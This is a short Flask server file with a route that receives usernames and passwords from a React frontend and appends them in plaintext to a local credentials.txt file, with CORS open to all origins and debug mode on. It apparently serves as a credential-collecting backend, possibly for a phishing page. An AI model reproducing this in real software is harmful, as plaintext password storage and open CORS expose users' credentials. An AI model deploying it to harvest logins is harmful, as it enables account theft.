from flask import Flask, redirect, render_template, request, jsonify
from flask_cors import CORS  # Import CORS here

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Render the main page
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        return redirect("/")
    else:
        return render_template("index.html")

# Route to handle credentials submission
@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    # Get the JSON data sent from React
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    # Write the credentials to a file
    with open('credentials.txt', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")
    
    # Respond back to the frontend
    return jsonify({'status': 'success', 'message': 'Credentials saved'})

if __name__ == '__main__':
    app.run(host='localhost', debug=True)
